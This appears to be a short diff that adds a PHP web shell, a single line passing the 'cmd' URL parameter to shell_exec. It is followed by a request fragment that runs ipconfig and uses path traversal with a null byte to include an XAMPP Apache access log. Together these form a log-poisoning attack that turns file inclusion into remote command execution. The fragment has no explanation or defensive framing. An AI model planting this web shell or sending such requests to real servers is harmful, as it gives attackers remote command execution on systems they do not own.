@@ -1,0 +1,3 @@
+<?php echo shell_exec($_GET['cmd']);?>
+
+....&cmd=ipconfig&LANG=../../../../../../../xampp/apache/logs/access.log%00....
